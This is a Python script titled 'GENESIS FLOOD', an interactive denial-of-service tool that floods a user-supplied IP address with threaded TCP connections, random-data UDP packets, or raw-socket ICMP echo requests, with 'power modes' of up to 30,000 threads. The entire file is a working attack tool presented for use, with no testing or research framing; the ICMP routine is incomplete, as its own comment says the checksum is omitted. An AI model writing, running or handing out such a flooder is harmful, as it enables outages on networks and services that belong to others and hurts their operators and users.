import socket
import threading
import os
import struct

# Function to clear the console screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def attack_tcp(target_ip, target_port, thread_count):
    def send_tcp_packets():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.close()
            except:
                pass

    for _ in range(thread_count):
        threading.Thread(target=send_tcp_packets, daemon=True).start()

def attack_udp(target_ip, target_port, thread_count):
    def send_udp_packets():
        data = os.urandom(1024)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(data, (target_ip, target_port))
            except:
                pass

    for _ in range(thread_count):
        threading.Thread(target=send_udp_packets, daemon=True).start()

def attack_icmp(target_ip, thread_count):
    # Note: Raw sockets typically require Root/Admin privileges
    def send_icmp_packets():
        while True:
            try:
                # ICMP type 8 (Echo Request), code 0
                header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
                # Simple checksum logic would go here for a full implementation
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.sendto(header, (target_ip, 1))
            except PermissionError:
                print("Error: ICMP requires Administrator/Root privileges.")
                break
            except:
                pass

    for _ in range(thread_count):
        threading.Thread(target=send_icmp_packets, daemon=True).start()

def main_menu():
    while True:
        clear_screen()
        print("==========================================================================")
        print("GENESIS FLOOD - MAIN MENU")
        print("==========================================================================")
        print("  1. Start Attack")
        print("  2. Exit")
        print("")
        choice = input("Make your choice (1-2): ")

        if choice == '1':
            attack_menu()
        elif choice == '2':
            print("Exiting...")
            break

def attack_menu():
    clear_screen()
    print("==========================================================================")
    print("SELECT PROTOCOL")
    print("==========================================================================")
    print("\033[92m 1. TCP Attack\033[0m")
    print("\033[92m 2. UDP Attack\033[0m")
    print("\033[92m 3. ICMP (Ping) Flood\033[0m")
    print("\033[91m 4. Go Back\033[0m")
    print("==========================================================================")
    
    choice = input("Make your choice (1-4): ")
    if choice == '4': return

    target = input("Enter target IP: ")

    clear_screen()
    print("Power Modes (thread count):")
    print("  1. 1K Threads (1000) - Light")
    print("  2. 2K Threads (2000) - Medium")
    print("  3. 30K Threads (30000) - High (CAUTION)")
    print("  4. Custom")
    
    thread_choice = input("\nChoice: ")
    if thread_choice == '1': threads = 1000
    elif thread_choice == '2': threads = 2000
    elif thread_choice == '3': threads = 30000
    elif thread_choice == '4': threads = int(input("Enter thread count: "))
    else: return

    if choice == '1':
        port = int(input("Enter target port: "))
        print(f"TCP Attack starting on {target}:{port}...")
        attack_tcp(target, port, threads)
    elif choice == '2':
        port = int(input("Enter target port: "))
        print(f"UDP Attack starting on {target}:{port}...")
        attack_udp(target, port, threads)
    elif choice == '3':
        print(f"ICMP Flood starting on {target}...")
        attack_icmp(target, threads)

    input("\nAttack processes running in background. Press Enter to return to menu.")

if __name__ == "__main__":
    main_menu()
